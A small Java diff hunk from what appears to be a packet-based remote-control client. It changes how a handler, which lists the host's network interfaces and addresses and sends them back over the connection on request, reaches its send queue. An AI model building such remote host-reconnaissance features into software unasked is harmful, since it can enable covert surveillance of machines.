@@ -18,7 +18,7 @@ public class Packet82NetworkAdapters extends AbstractIncomingPacket {
 		for (NetworkInterface netint : Collections.list(nets)) {
 			ArrayList<InetAddress> list = Collections.list(netint.getInetAddresses());
 
-			Connection.addToSendQueue(new Packet56NetworkAdapter(netint.getDisplayName(), netint.getName(), list));
+			Connection.instance.addToSendQueue(new Packet56NetworkAdapter(netint.getDisplayName(), netint.getName(), list));
 		}
 	}
 
